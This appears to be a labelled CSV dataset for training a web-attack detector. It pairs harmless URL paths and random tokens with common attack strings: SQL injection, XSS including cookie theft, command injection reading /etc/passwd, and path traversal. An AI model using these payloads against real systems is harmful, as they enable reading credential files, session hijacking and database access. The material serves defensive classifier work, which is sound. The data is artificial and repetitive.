payload,label
/register?session=26318,0
admin%00' OR 1=1,1
/user?id=6968,0
<script>var a=613;alert(a)</script>,1
<script>var a=842;alert(a)</script>,1
Xn92ApLqH7S,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 3=9 --,1
/profile?id=981,0
/login?id=87,0
checkout,0
admin'/* bypass */OR 1=1,1
<script>var a=800;alert(a)</script>,1
/home?id=8074,0
index,0
s E l E c T * f R o M a d m i n,1
<script>var a=722;alert(a)</script>,1
/about?session=73218,0
' OR 7=7 --,1
kx9TRyXd,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?session=52045,0
/dashboard?session=15836,0
<script>var a=719;alert(a)</script>,1
/login?session=38530,0
<script>var a=113;alert(a)</script>,1
onerror=alert(1),1
onerror=alert(1),1
/profile?session=55187,0
/checkout?session=95639,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
/login?id=5777,0
/dashboard?session=28898,0
qU6CKGWmk,0
s E l E c T * f R o M a d m i n,1
/user?session=81423,0
/dashboard?id=7895,0
; cat /etc/passwd,1
/checkout?id=6896,0
cart,0
settings,0
/user?id=4029,0
/register?session=53418,0
/blog?id=6981,0
index,0
; cat /etc/passwd,1
R6SzndWFJX5THja,0
admin%00' OR 1=1,1
<script>var a=963;alert(a)</script>,1
' OR 6=1 --,1
search,0
' OR 3=5 --,1
6dbo6Caf0q4IPOn,0
' OR 3=8 --,1
<script>var a=159;alert(a)</script>,1
; cat /etc/passwd,1
' OR 3=9 --,1
/cart?session=40521,0
' OR 8=3 --,1
d2H15p5G0GmQG,0
<script>var a=83;alert(a)</script>,1
/home?id=6860,0
<script>var a=402;alert(a)</script>,1
home,0
../../../windows/win.ini,1
/home?session=69180,0
DR1pObEMlS,0
M11z0b6ONLX,0
/home?session=60179,0
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
profile,0
' OR 2=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=3 --,1
javascript:alert(1),1
' OR 9=3 --,1
javascript:alert(1),1
/login?session=30128,0
' OR 9=2 --,1
/cart?session=15930,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=959;alert(a)</script>,1
<script>var a=135;alert(a)</script>,1
/checkout?session=13255,0
/about?session=67919,0
' OR '1'='1,1
xmnefoFFYRb,0
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
/cart?id=9194,0
settings,0
register,0
/cart?session=31713,0
/checkout?session=97233,0
' OR 9=8 --,1
' OR 4=8 --,1
/login?id=4105,0
uANJFqA2r,0
admin' --,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/about?id=7940,0
lmJr0nx9X,0
/dashboard?session=69472,0
' OR 3=9 --,1
javascript:alert(1),1
' OR 8=8 --,1
about,0
contact,0
; cat /etc/passwd,1
; cat /etc/passwd,1
' OR 1=1 --,1
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=75;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
user,0
/search?id=3926,0
; cat /etc/passwd,1
<script>var a=184;alert(a)</script>,1
/register?session=28387,0
' OR 5=4 --,1
P3Aj2jLpUP2A,0
/contact?session=30259,0
/contact?id=5938,0
/user?id=730,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
qgPlbt6Iy7i,0
javascript:alert(1),1
bduDnvhaO,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/home?session=78090,0
about,0
/dashboard?id=3279,0
checkout,0
checkout,0
' OR 9=8 --,1
../../../../etc/passwd,1
' OR 9=7 --,1
about,0
login,0
login,0
